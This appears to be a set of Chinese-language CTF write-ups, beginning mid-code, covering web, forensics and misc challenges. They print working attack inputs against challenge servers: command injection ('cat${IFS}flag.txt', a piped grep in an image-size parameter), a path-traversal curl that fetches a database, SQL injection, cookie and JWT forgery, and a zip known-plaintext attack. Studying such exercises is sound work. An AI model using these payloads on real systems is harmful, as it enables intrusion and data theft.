        return res.status(200).send(process.env.FLAG)
    } catch {
        return res.status(200).send("You are not verified")
    }
})
```

然后伪造一个xss攻击即可（这里可以用一个新的网页）[http://www.requestcatcher.com](http://www.requestcatcher.com/)然后即可获取token

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTQ3MTU2fQ.XM_PJRCuVe5oI7zTXl93U_OMSg2ynpgrxoiAie1P33Y

然后去解码

用jwt tool爆破得到密码为

banana

然后即可伪造然后获取flag

感觉挺简单的一道题（做的时间太短了、太浮躁了）

抓包获取cookie：得到：session_id = Q1RGIFBhcnRpY2lwYW50

原本用md5解密这个没解出来就卡在这里了、其实是base64解码的

然后伪造一个Admin的base64

YWRtaW4=

这里注意有一点、为了安全地进行URL编码，并避免与URL中的特殊字符混淆，可以选择移除Base64编码中的填充字符"="，或对其进行URL编码（即百分比编码）。这样可以确保最终的编码数据在URL中传输时不会引起混淆或错误解析。

怪不得很少见到base64中的==

好蠢啊wc，这个题只能限制输入一个word的意思就是过滤了空格，妈的直接绕空格就行了，原本应该是很熟练的

```python
from pwn import *
context.log_level = 'debug'
# 创建远程连接
p = remote('184.72.87.9','8008')
p.recv()
p.sendline("cat${IFS}flag.txt")
p.recv()
```



很有意思的代码审计

源码如下

```go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

type RequestHandler struct {
	burgers int
	conn    net.Conn
}

var GLOBAL_STATE RequestHandler

func main() {
	// Listen on TCP port 8080 on all interfaces.
	ln, err := net.Listen("tcp", ":1337")
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		return
	}
	defer ln.Close()
	fmt.Println("Listening on :1337")

	GLOBAL_STATE = RequestHandler{burgers: 0, conn: nil}

	for {
		// Accept a connection.
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			return
		}

		// burger to the GLOBAL_STATE from the request handler so we can track between requests
		handler := RequestHandler{burgers: GLOBAL_STATE.burgers, conn: conn}
		go handler.handleRequest()
	}
}

func (r *RequestHandler) handleRequest() {
	defer r.conn.Close()

	reader := bufio.NewReader(r.conn)

	for {
		// Set a deadline for reading. If a second passes without reading any data, a timeout will occur.
		r.conn.SetReadDeadline(time.Now().Add(1 * time.Second))

		// Read and parse the request headers
		request, err := readHTTPHeader(reader)
		if err != nil {
			return
		}

		requestLines := strings.Split(request, "\n")
		if len(requestLines) < 1 {
			fmt.Println("Invalid request")
			return
		}

		// Parse the request line
		requestLine := strings.Fields(requestLines[0])
		if len(requestLine) < 3 {
			fmt.Println("Invalid request")
			return
		}

		method := requestLine[0]
		uri := requestLine[1]

		// Check if the request is a valid GET request
		if method != "GET" {
			r.conn.Write([]byte("HTTP/1.1 405 Method Not Allowed\r\n\r\n"))
			return
		}

		// Handle GET request
		if uri == "/" {
			r.generateResponse(`
Welcome to Crabby Clicker!
A HTTP based clicker game where you can earn burgers to get the flag. 
Make a request to /click to gain a burger.
I use my own custom HTTP server implementation to manage the state of the game.
It's not fully working, I am running into some bugs.
			`)
		} else if uri == "/click" {
			// BUG: Weird thing where the state is not updated between requests??
			r.burgers++
			r.generateResponse("burger added")
		} else if uri == "/flag" {
			if r.burgers >= 100 {
				r.generateResponse(fmt.Sprintf("Flag: UMASS{%s}", os.Getenv("FLAG")))
			} else {
				r.generateResponse("Not enough burgers")
			}
		} else {
			r.generateResponse("Not found")
		}
	}
}

func (r *RequestHandler) generateResponse(message string) {
	r.conn.Write([]byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n%s\nburgers: %d\n", message, r.burgers)))
}

func readHTTPHeader(reader *bufio.Reader) (string, error) {
	// Read headers until \r\n\r\n
	var requestLines []string
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return "", err
		}
		requestLines = append(requestLines, line)
		// Check if the current line marks the end of the headers
		if line == "\r\n" {
			break
		}
	}
	return strings.Join(requestLines, ""), nil
}

```

大概是自己实现的一个readHTTPHeader，问题的关键在于每次开一个tcp连接的时候会有以下操作

```go
// burger to the GLOBAL_STATE from the request handler so we can track between requests
		handler := RequestHandler{burgers: GLOBAL_STATE.burgers, conn: conn}
		go handler.handleRequest()
```

就是把burger清0然后重新开始记录

于是可以把多个请求放到一个request里面即可获取flag

![image-20240428160953414](C:/Users/86186/Desktop/write-up/ctfs/UMASSCTF/assets/image-20240428160953414.png)

用Debug讲一下这个具体的实现原理吧

这里的reader获取的是报文的具体内容

![image-20240428162015759](C:/Users/86186/Desktop/write-up/ctfs/UMASSCTF/assets/image-20240428162015759.png)

每次readHTTPHeader都会读取一部分报文中的内容然后进行burger +1

主要是在一个tcp连接报文中多次请求数据然后使burger到100然后可获取flag

对于不同的http请求的话会建立不同的tcp连接，从而导致handler := RequestHandler{burgers: GLOBAL_STATE.burgers, conn: conn}这个conn的清0，所以可以在一个tcp连接中发送多次请求即可

```
GET / HTTP/1.1
Host: holesomebirthdayparty.ctf.umasscybersec.org
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Date: Sun, 14 Jul 2024 00:00:00 GMT
User-Agent:Bikini Bottom
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: fr
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cookie: flavor=chocolate_chip; Login=eyJsb2dnZWRpbiI6IHRydWV9


```

挺简单的一道题，卡最久的是date要是海绵宝宝的生日

感觉自己做的时间长后会学到很多trick

题目中的DIRBUSTER or any similar tools are NOT allowed. 被自己理解成了可以暴力扫目录、于是用dirsearch和御剑扫了一年、自己的英语水平太垃圾了

然后开始审计！

发现一个url 

```
http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=house&size=300x494
```

然后size修改一下会报错

```
Server: SimpleHTTP/0.6 Python/3.10.14
Date: Fri, 26 Apr 2024 07:06:00 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 566

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 500</p>
        <p>Message: Error resizing image: convert-im6.q16: invalid argument for option `-resize': 300x=! @ error/convert.c/ConvertImageCommand/2563.
.</p>
        <p>Error code explanation: 500 - Server got itself in trouble.</p>
    </body>
</html>
```

然后预期中的命令执行是这样

```
convert bbb.png -resize 200×200! bbb.png
```

开始构造命令注入

然后构造exp

拿到命令执行后找了n年flag的位置

怎么不直接放在/flag

下次直接grep搜了

```
http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=house&size= | cat $(grep -ri  'UMASS{.*}'  ../../..) 
```

然后即可获取flag

感觉命令行注入总是会藏在意想不到的位置

直接抓包修改捐赠为负数？

```
POST /api/donate HTTP/2
Host: donations-api.challs.umdctf.io
Cookie: session=eyJ1c2VybmFtZSI6ICJjeW55NjY2In0=.Zi9_nQ.5IQX7WgUNQiUViUduSx7EE4OQTQ
Content-Length: 35
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://donations.challs.umdctf.io
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://donations.challs.umdctf.io/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

to=lisanalgaib&currency=-1000000000
```

然后就最大了

---
title: EnableMe
date: 2024-02-09 13:56:12
categories:
  - WriteUp
tags:
  - Forensics
---

给了一个docm后缀的文件。然后搜索得知 启用宏的Microsoft Word 文档

宏也就是可以执行一些代码（也就是用于勒索）

这里打开后然后出现了一个

![img](https://notes.sjtu.edu.cn/uploads/upload_016339c996f73e45e0b9ba1d86946943.png)

意思是被勒索了是吧hhh

然后查看宏文件，这里可以利用[olevba](https://github.com/decalage2/oletools/wiki/olevba)来查看文件，丢一篇这个软件的[介绍](https://medium.com/r3d-buck3t/extracting-macros-with-oletools-6c3a64c02549)然后即可分析

![img](https://github.com/HashemSalhi/CTF-Writeups/raw/main/UofTCTF%202024/Forensics/EnableMe/Screenshots/Screenshot1.png)

然后在word里面编辑

![](https://notes.sjtu.edu.cn/uploads/upload_763e058d7d5dd3372505e79537f704c1.png)

即可弹出flag


感觉这种题在现实生活中会比较常见，感觉很容易被疏忽

为什么自己试了1' or 1=1 --+就可以正确后没想过9 ' or 1=1 --+ 

主要是一个逻辑漏洞

```js
if (req.body.issue < 0) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

      if (decoded.subscription !== "premium" && issue >= 9) {
        return res
          .status(403)
          .json({ message: "Please subscribe to access this issue" });
      }

      issue = parseInt(issue);

      if (Number.isNaN(issue) || issue > articles.length - 1) {
        return res.status(400).json({ message: "Invalid issue number" });
      }

```

这里对于req.issue进行查找

然后是先判断Issue是否大于9，然后再用parseInt解析

而parseInt解析是可以解析特殊字符的，所以可以构造

9 ' or 1=1 --+

即可获取

这题的混淆项就是一直再考虑jwt怎么绕过这些问题



总感觉自己太浮躁了，没有仔细的审web就直接去看wp了，什么眼高手低

又是一道command injection的题目，什么哈工大遗题，

先看返回包

![image-20240209120308531](C:/Users/86186/AppData/Roaming/Typora/typora-user-images/image-20240209120308531.png)

这里采用了命令拼接的方法，然后即可用${whoami}来代替pitch

即可用命令替代的方式来获取最终flag

很有意思的一道github信息泄露题，原来这就是cloud的含金量

github中完全的删除一个敏感数据是很难的可以看这个

https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository

关键在这个？：: This article tells you how to make commits with sensitive data unreachable from any branches or tags in your repository on GitHub.com. However, those commits may still be accessible in any clones or forks of your repository, directly via their SHA-1 hashes in cached views on GitHub,

然后从activity可以查看到每个用户的commit，于是可以查看到关键信息

也可以用git-secret查看信息即可获取flag

连chatgpt都比我会审计源码（下次做AWDP真要搞一个chatgpt用吧）

源码如下

```go
package main

import (
	"crypto/subtle"
	"embed"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"path/filepath"

	"github.com/gin-gonic/gin"
	"github.com/jmoiron/sqlx"
	_ "github.com/mattn/go-sqlite3"
)

//go:embed views
var viewFS embed.FS

func must(err error) {
	if err != nil {
		fmt.Fprintln(os.Stderr, "Fatal error:", err)
		os.Exit(1)
	}
}

var flag string = os.Getenv("FLAG")

type Cents int

func (c Cents) String() string {
	return fmt.Sprintf("$%v.%02d", int(c)/100, int(c)%100)
}

type Listing struct {
	ID          string
	Title       string
	Description string
	PriceCents  Cents `db:"priceCents"`
	Image       string
}

type User struct {
	Username string
	Password string
}

func main() {
	db := sqlx.MustOpen("sqlite3", "file:db.sqlite3")

	e := gin.Default()
	e.SetHTMLTemplate(template.Must(template.ParseFS(viewFS, "views/**")))

	e.GET("/", func(c *gin.Context) {
		listings := make([]Listing, 0)
		err := db.Select(&listings, "SELECT * FROM listing;")
		if err != nil {
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}
		c.HTML(http.StatusOK, "index.html", gin.H{"Listings": listings})
	})
	e.GET("/search", func(c *gin.Context) {
		query := c.Query("q")
		listings := make([]Listing, 0)
		err := db.Select(&listings, `
			SELECT *
			FROM listing
			WHERE title LIKE '%' || ? || '%'
			OR description LIKE '%' || ? || '%';
		`, query, query)
		if err != nil {
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}
		c.HTML(http.StatusOK, "search.html", gin.H{
			"Listings": listings,
			"Query":    query,
		})
	})
	e.GET("/product", func(c *gin.Context) {
		id := c.Query("id")
		var listing Listing
		err := db.Get(&listing, "SELECT * from listing WHERE id = ?;", id)
		if err != nil {
			c.AbortWithError(404, err)
			return
		}
		c.HTML(http.StatusOK, "product.html", listing)
	})
	e.GET("/assets", func(c *gin.Context) {
		id := c.Query("id")
		path := filepath.Join("assets", filepath.Clean(id))
		c.File(path)
	})
	e.GET("/cart", underConstruction)
	e.GET("/admin", func(c *gin.Context) {
		cookie, err := c.Cookie("FLAG")
		if err != nil || subtle.ConstantTimeCompare([]byte(cookie), []byte(flag)) == 0 {
			c.HTML(http.StatusOK, "admin.html", nil)
			return
		}
		c.String(http.StatusOK, flag)
	})
	e.POST("/admin", func(c *gin.Context) {
		username := c.PostForm("username")
		password := c.PostForm("password")
		var user User
		err := db.Get(&user, "SELECT * FROM user WHERE username = ?", username)
		if err != nil {
			c.HTML(http.StatusUnauthorized, "admin.html", "Username or password is incorrect")
			return
		}
		if subtle.ConstantTimeCompare([]byte(password), []byte(user.Password)) == 0 {
			c.HTML(http.StatusUnauthorized, "admin.html", "Username or password is incorrect")
			return
		}
		c.Writer.Header().Add("Set-Cookie", "FLAG="+flag)
		c.Writer.Header().Add("Content-Type", "text/plain")
		c.Writer.WriteString(flag)
	})

	if os.Getenv("LIVE_RELOAD") != "" {
		e.Use(func(c *gin.Context) {
			e.LoadHTMLGlob("views/**")
		})
	}

	must(e.Run("0.0.0.0:8080"))
}

func underConstruction(c *gin.Context) {
	c.HTML(http.StatusOK, "under-construction.html", gin.H{"BackURL": c.Request.Referer()})
}

```

一直在思考在/admin路由下如何进行注入什么的来get到管理员权限，

后面看wp，问题在/assets路由下，可以构造

```shell
curl 'http://35.94.129.106:3001/assets?id=../db.sqlite3' --path-as-is -o db.sqlite3
```

来实现任意文件读取。

然后在ubuntu中读取该数据库即可获取账号密码

![image-20240319153832322](C:/Users/86186/Desktop/write-up/ctfs/vikeCTF/assets/image-20240319153832322.png)

注：直接把main.go丢给chatgpt都可以分析出错误

![image-20240319153900913](C:/Users/86186/Desktop/write-up/ctfs/vikeCTF/assets/image-20240319153900913.png)

第五个



感觉距离大佬的路还是很远，这里主要是使用了python的[pyshark](https://github.com/KimiNewt/pyshark)模块来分析流量包

然后提取value值就可以了

```python
import pyshark,re
cap = pyshark.FileCapture('sqlshark.pcap',display_filter='http')
last_packet = None
last_text = ''
result = {}
def extract(text):
    a = re.search(r'Value.*frOm (\d*).*in\((\d*)\).*#', text)
    key,value = a.group(1),a.group(2)
    result[key] = value
    print(key,value)
for packet in cap:
    text = str(packet.layers[-1:][0])
    if 'success' in text and last_packet is not None:
        extract(last_text)
    last_packet = packet
    last_text = text
for c in result:
    print(chr(int(result[c])),end='')
```

---
title: easy_raw
date: 2023-12-21 15:52:25
categories:
  - WriteUp
tags:
  - Forensics

---

感觉要在取证的路上越走越远了hhh

先分析raw文件的系统

```shell
vol.py -f rawraw.raw imageinfo
```

然后发现是Win7SP1x64，从此以后都要加上--profile=Win7SP1x64 了

然后查看进程

```shell
vol.py -f rawraw.raw --profile=Win7SP1x64 pslist
```

发现可疑进程  WinRAR.exe和 VeraCrypt.exe

然后查看cmdline

```shell
vol.py -f rawraw.raw --profile=Win7SP1x64 cmdline
```

发现Command line : "C:\Program Files\WinRAR\WinRAR.exe" "C:\Users\Administrator\Documents\pass.zip"

把一个pass.zip压缩了，把这个进程dump出来

```shell
vol.py -f rawraw.raw --profile=Win7SP1x64 memdump -p 2088 -D output_directory
```

然后发现一个pass.txt加密的

![img](https://notes.sjtu.edu.cn/uploads/upload_bc8786a594a3bdef87084a71529923b3.png)

然后有个提示为Have a good New Year!!!

然后输入新年的那一天

20240210

然后破解成功

然后查看编辑栏 clipboard -v 获得secret的密码为

![img](https://notes.sjtu.edu.cn/uploads/upload_27903a5af83b9503c6e4a055170fe16e.png)

密码为 `DasrIa456sAdmIn987`使用密码 `DasrIa456sAdmIn987` 对 mysecretfile.rar 进行解压，获得 mysecretfile 文件

然后感觉为VeraCrypt加密

[VeraCrypt](https://www.veracrypt.fr/) 是一个开源的磁盘加密工具，用于创建加密容器和加密整个磁盘分区。它是 TrueCrypt 项目的继任者

然后把pass.txt当做密钥解密发现一个data.xslk然后用vol的插件mimikatz即可获取密码，打开搜索flag即可获得

这里吐槽一下mimikatz这个插件装了好久！！！啊啊啊python2的东西装的好麻烦啊

要不是mimikatz太重要了，一定就去用系统配置的了

---
title: easy_tables
date: 2023-12-21 15:52:25
categories:
  - WriteUp
tags:
  - Misc
---

比较懒直接放exp吧

照着别人的wp手敲一份感觉对于python的理解都变深了好多，感觉比重新构建一个数据库简单的多

```python
import csv
import time
# 分别打开四个csv文件
lists = ['users','permissions','tables','actionlog']
with open('users.csv', 'r', encoding="utf-8") as read_obj:
    csv_reader = csv.reader(read_obj)
    list_of_csv = list(csv_reader)
    users = list_of_csv
with open('permissions.csv', 'r', encoding='utf-8') as read_obj:
    csv_reader = csv.reader(read_obj)
    list_of_csv = list(csv_reader)
    permissions = list_of_csv
with open('tables.csv', 'r', encoding='utf-8') as read_obj:
    csv_reader = csv.reader(read_obj)
    list_of_csv = list(csv_reader)
    tables = list_of_csv
with open('actionlog.csv', 'r', encoding='utf-8') as read_obj:
    csv_reader = csv.reader(read_obj)
    list_of_csv = list(csv_reader)
    actionlog = list_of_csv

name_ti = 0
per_ti = 0
flag = ''
for log in actionlog[1:]:
    log_id = log[0]
    log_name = log[1]
    log_time = log[2].split(' ')[1]
    log_opt = log[3]

    for users_A in users[1:]:
        users_id = users_A[0]
        users_name = users_A[1]
        users_per = users_A[3]
        if users_name == log_name:
            name_ti = 0

            for per_A in permissions[1:]:
                per_id = per_A[0]
                per_qx = per_A[2]
                per_table = per_A[3]

                if users_per == per_id:
                    log_opt_list = log_opt.split(' ')
                    per_table_list = per_table.split(',')
                    # 对每个表进行遍历
                    for tb in tables[1:]:
                        print(tb)
                        tb_id = tb[0]
                        tb_name = tb[1]
                        tb_time = tb[2].split(",")
                        #先找出操作的表
                        #且操作的表应该在可允许的表中
                        if tb_name in log_opt_list:
                            if tb_id in per_table_list:
                                if log_opt_list[0] in per_qx:
                                    try:
                                        tb_time_1 = tb_time[0].split('~')
                                        tb_time_2 = tb_time[1].split('~')
                                        if tb_time_1[0] < log_time < tb_time_1[1] or tb_time_2[0] < log_time < \
                                        tb_time_2[1]:
                                            pass
                                        else:
                                            print('编号:',log_id,"账户不在规定时间内操作",
                                                  users_id+'_'+per_id+'_'+tb_id+'_'+log_id)
                                            flag +=users_id+'_'+per_id+'_'+tb_id+'_'+log_id
                                    except:
                                        tb_time = tb_time[0].split("~")
                                        if tb_time[0] < log_time < tb_time[1]:
                                            pass
                                        else:
                                            print('编号:', log_id, '账户不在规定时间内操作操作',
                                                  users_id + '_' + per_id + '_' + tb_id + '_' + log_id)
                                            flag += users_id + '_' + per_id + '_' + tb_id + '_' + log_id + ','
                                else:
                                    print('编号:', log_id, '为对表执行不属于其权限的操作',
                                          users_id + '_' + per_id + '_' + tb_id + '_' + log_id)
                                    flag += users_id + '_' + per_id + '_' + tb_id + '_' + log_id + ','
                            else:
                                print('编号:', log_id, '为对不可操作的表执行操作',
                                      users_id + '_' + per_id + '_' + tb_id + '_' + log_id)
                                flag += users_id + '_' + per_id + '_' + tb_id + '_' + log_id + ','
                            break
                    break
            break
        else:
            name_ti += 1
        if name_ti == len(users[1:]):
            print('编号:', log_id, '为不存在用户操作', '0_0_0_' + log_id)
            flag += '0_0_0_' + log_id + ','
            name_ti = 0
flag = flag.split(',')
flag = sorted(flag)
flag = ','.join(str(fla) for fla in flag)
print(flag)
```





审计源码的时候发现有随机生成的部分

后面看了wp发现就是用pwntools一直模拟然后尝试概率后面获得flag1（确实做少了）

唯一做出来的web题（为了做出这道题甚至自学了seleuinm，但是输在自己最喜欢的jwt了:sob:）

第一问直接无脑穷举：

```python
# coding: utf-8
import requests
import re
emojs = [
    '💃','👼','🐐','🐟','💏','👣','🐧','👀','💃','🐥','🐯','💈','🐳','🐬','🐛','👬','🐲','🐩','🐪','🐗','👟','👕','🐙','👻','👀','💍','👋','💋','👣','👝','👦','🐲','🐭','👦','👬','🐝','💁','💄','👇','🐴','🐝','👫','🐒','🐧','🐩','👎','👇','🐴','👎','👽','🐻','👎','💈','👜','👄','👟','👻','🐞','🐿','💅','💊','👼','💀','👊',
    '👙','👔','🐳','👯','💈','👘','💇','🐢','👓','🐜','👌','👦','🐙','🐹','🐙',
    '👲','👨','🐮','🐕','👲','💄','🐵','👒','👥','🐖','🐲','🐷','🐿','🐸','👜','👔','🐵','👛','💄','👇','🐫','💀','🐙','👆', '🐻', '🐦', '👞', '🐤', '👋', '👫', '👙', '👇', '💁', '🐸', '👟', '💈', '🐩', '🐗', '👐', '👰', '🐴', '👕', '🐗', '🐙', '👸', '🐢', '🐴', '🐨', '💎', '👙', '👒', '👹', '👵', '👅', '👁', '👬', '💉', '🐬', '👵', '🐶', '👅', '🐿', '👰', '👋', '🐯', '🐝', '👿', '💅', '🐔', '🐪', '👠', '👞', '👓', '🐲', '👼', '🐧', '👠', '👠', '👾', '👊', '👣', '👽', '👕', '👋', '🐴', '🐫', '🐲', '👋',
    '👰', '👞', '🐽', '👳', '🐹', '👓', '🐓', '👂', '👐', '👳', '👣', '🐲', '🐪', '👥', '👣', '💅', '👧', '👞', '🐞', '🐒', '🐖', '👓', '👛', '🐥', '🐳', '👘', '👜', '👼', '🐮', '💉', '👟', '🐣', '👸', '🐛', '👉', '👝', '👃', '👸', '🐴', '👗', '💃', '💆', '🐙', '👱', '👯', '👣', '👚'
    '🐰', '🐼', '👕', '👈', '🐰', '💋', '🐛', '🐕', '🐺', '👆', '👽', '🐪', '👗', '👲', '👔', '🐵', '💇', '🐓', '💅', '🐒', '🐾', '🐩', '💀', '👽',
    '👣', '👐', '🐮', '🐛', '🐻', '🐤', '🐡', '👌', '👠', '🐲', '🐵', '👠', '🐛', '💎', '💂', '💎', '🐭', '👏', '👁', '👓', '🐛', '👖', '👢', '🐺',
    '💉', '🐔', '🐓', '👤', '👫', '🐛', '🐗', '👍', '👯', '🐽', '👥', '👤', '👑', '👅', '👸', '👌', '👊', '👚', '👠', '🐫', '🐘', '👒', '👄', '💆',
    '👽', '🐱', '🐵', '👵', '👧', '🐠', '👺', '🐾', '👭', '👫', '👎', '🐦', '💍', '🐲', '🐚', '👪', '🐧', '👪', '👬', '👣', '💎', '👘', '🐬', '👾',
    '🐑', '👫', '👫', '👓', '🐴', '👦', '👊', '👂', '🐘', '💋', '👮', '👖', '👙', '👛', '👟', '👊', '👁', '💁', '🐬', '🐺', '👯', '🐪', '👘', '👢',
    '🐞', '👣', '🐝', '🐦', '👍', '👓', '👢', '🐺', '💆', '🐨', '👡', '💇', '🐤', '👼', '🐨', '👬', '🐯', '🐚', '🐣', '🐞', '🐞', '👤', '👇', '👐',
    '🐿', '👶', '💂', '💌', '🐛', '👫', '🐬', '👶', '👶', '🐼', '💏', '👄', '👓', '🐵', '👴', '👢', '💉', '🐱', '👩', '👀', '👻', '🐣', '🐮', '👈',
    '🐺', '👤', '🐜', '🐵', '🐽', '🐔', '🐗', '👭', '🐲', '🐼', '🐞', '👆', '👢', '👴', '👱', '👹', '👓', '💄', '💃', '👈', '🐻', '👦', '👦', '👰',
 '   🐺', '🐯', '👣', '🐦', '👴', '💇', '💊', '👜', '🐾', '👸',]
emojs = list(set(emojs))
obj = '💈💅👼💁👦👗💊💊👱👇👔💆'
for i in range(13,65):
    for emoj in emojs:
        url = 'http://prob14.geekgame.pku.edu.cn/level2?guess=' + obj + emoj
        headers = {
            'Host': 'prob14.geekgame.pku.edu.cn',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cookie': 'PLAY_SESSION=eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiNiIsInRhcmdldCI6Ilx1RDgzRFx1REM3Qlx1RDgzRFx1REM4Nlx1RDgzRFx1REM2MFx1RDgzRFx1REM2OVx1RDgzRFx1REM3Q1x1RDgzRFx1REM0Nlx1RDgzRFx1REM3RVx1RDgzRFx1REM4QVx1RDgzRFx1REM0OFx1RDgzRFx1REM1NFx1RDgzRFx1REM4MFx1RDgzRFx1REM2Mlx1RDgzRFx1REM2Mlx1RDgzRFx1REM3NVx1RDgzRFx1REM3Nlx1RDgzRFx1REM1NFx1RDgzRFx1REM2OVx1RDgzRFx1REM4Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM1M1x1RDgzRFx1REM3Rlx1RDgzRFx1REM4OFx1RDgzRFx1REMzRlx1RDgzRFx1REM1Rlx1RDgzRFx1REM0N1x1RDgzRFx1REM0NFx1RDgzRFx1REM1MVx1RDgzRFx1REM1M1x1RDgzRFx1REM1Nlx1RDgzRFx1REM3M1x1RDgzRFx1REM2N1x1RDgzRFx1REM2Mlx1RDgzRFx1REM1NFx1RDgzRFx1REM1OFx1RDgzRFx1REM1QVx1RDgzRFx1REM3RFx1RDgzRFx1REM3NVx1RDgzRFx1REM4NFx1RDgzRFx1REM4M1x1RDgzRFx1REM4OFx1RDgzRFx1REM0OFx1RDgzRFx1REM0MVx1RDgzRFx1REM4OVx1RDgzRFx1REM0M1x1RDgzRFx1REM3QVx1RDgzRFx1REM3OFx1RDgzRFx1REM1NFx1RDgzRFx1REM1Q1x1RDgzRFx1REM0NFx1RDgzRFx1REM3M1x1RDgzRFx1REM1Q1x1RDgzRFx1REM4MFx1RDgzRFx1REM1MVx1RDgzRFx1REM3NFx1RDgzRFx1REM0MVx1RDgzRFx1REM3Mlx1RDgzRFx1REM0NFx1RDgzRFx1REM3Qlx1RDgzRFx1REM3OFx1RDgzRFx1REM4Nlx1RDgzRFx1REM3QVx1RDgzRFx1REM1Qlx1RDgzRFx1REM1Nlx1RDgzRFx1REM0OSJ9LCJuYmYiOjE2OTc0NDg3NzgsImlhdCI6MTY5NzQ0ODc3OH0.djbGgovDYyaB54BV3UjkaxiURS2yPzRPna2nonBII_Q',
            'Connection': 'close'
        }
        response = requests.get(url, headers=headers)
        lines = response.text.split('\n')
        content = lines[18]
        count = content.count('🟩')
        if count == i:
            obj += emoj
            print(url)
            break
    print('第',i,'个字符结束')

```

然后第二问发现其只需要8次，理论上这种游戏是做不出来答案的，于是分析session（jwt）

解密后如下

```json
{
  "data": {
    "level": "2",
    "remaining_guesses": "8",
    "target": "💈👑👑👱👴👘👸👇👲👂👅👿👆👅💆👧👡👜👅👥👪👾💀👡👷💃👨💇👥👈👂👺💈👲💃👵💈👓💄👒💅👅💆💆👝💇💇👾👲💊👦👷👽👸👑👱👢👡👕👇👅👷👦👦"
  },
  "nbf": 1698199847,
  "iat": 1698199847
}
```

把这个提交即可获得答案

第三问主要是复用cookie然后求解（妈的感觉都不是常规游戏方法做出来、看看隔壁扫雷）

很早就发现了rz和sz传递文件的功能（但是还是失败了）:sob:感觉平时rz还是用的少了

一开始用虚拟机nc连接一直显示B0000000，一收就是rz和lz的zmodem，然后后面用xshell和secureCRT连接，但是也都不太行（我的xshell辜负了我！！！）secureCRT要用RAW协议链接，感觉我也想不出来（这几个工具貌似是对zmodem不支持），后面看来WP，发现要用WindTerm_2.6.0，一用！真他妈香啊，脚本小子真的香



原本以为是一道很难的替换密码题目（谁知道是ROT13）当时还惊讶他们怎么能那么快的穷举，后来发现是自己小丑了

解题思路：先用stegsolve分帧获取

synt{unirshangtrrxtnzr}

然后前面的一定是flag 有一个替换对syntzrx=flagmek

然后是ROT13（每个字母的偏移量相同）、自己并没有看出当时是ROT13，所以采用了较笨的穷举+猜测

下次可以先试一下凯撒密码（还是题目做少了）

第一问是被提示后才解出来的，主要对selenium没了解之前怎么会想到chromedriver_linux64.zip

第一问可以打开压缩包看里面内容，发现有一个chromedriver_linux64.zip和一个flag.txt,两个文件的大小都被确定了，chromedriver_linux64.zip是一个谷歌浏览器的驱动，可以根据大小找到原有的版本（我这里是一个一个版本的去翻找），然后即可进行明文攻击

https://www.freebuf.com/articles/network/255145.html 这里用AAPR解压缩攻击（这样看ZIP文件的安全性确实不高）

然后就是没做出来的第二问、怎么第二问和第一问的密钥不一样呢

发现第二问的文件是pcapng文件，发现pcapng的开头部分是一个叫Section HeaderBlock的数据结构

* 前四个字节一定是0a 0d 0d 0a

* 后四个字节表示SHB的大小，后面两个字节大概是00
* 后四个字节表示端序 一般都是4d3c2b1a
* 后面四个字节表示版本号 01000000

我们已经确定了14个字节中的十个字节0a0d0d0a____00004d3c2b1a01000000

然后就可以开跑明文攻击

```shell
./bkcrack -C challenge_2.zip -c flag2.pcapng -p pcap_header.bin -o 6 -x 0 0a0d0d0a 
```

各个参数的讲解

-C : 要破译的zip文件

-c : 要解密出来的文件

-p : 指定的明文

-o：明文在文件中的偏移量

-x: 压缩包内目标文件的偏移 部分一直明文值

对于zip的文件破解又有了新的认识



第一次做这种存信息收集的题目（感觉水平确实欠缺）

### 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？

这个的话直接google就可以搜到答案：

sbatch

### 根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？

这个的话我是找一个小米店找了实机查看了版本号才知道

![image-20231023160748601](./assets/image-20231023160748601.png)![(./assets/image-20231023160749147.png)

